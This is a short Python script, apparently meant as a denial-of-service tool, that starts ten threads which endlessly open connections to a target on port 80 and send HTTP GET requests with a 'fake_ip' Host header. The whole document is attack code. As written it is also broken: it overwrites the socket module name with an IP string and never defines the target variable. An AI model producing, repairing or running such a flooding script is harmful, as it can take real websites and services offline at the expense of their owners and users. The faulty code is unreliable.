import threading
import socket

fake_ip = '182.21.20.32'
port = 80
socket = '192.168.15.255'

def attack():
    print("Starting DDOS")
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s= socket.socket(socket.AF_INET)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

for i in range(10):
    thread = threading.Thread(target=attack)
    thread.start()
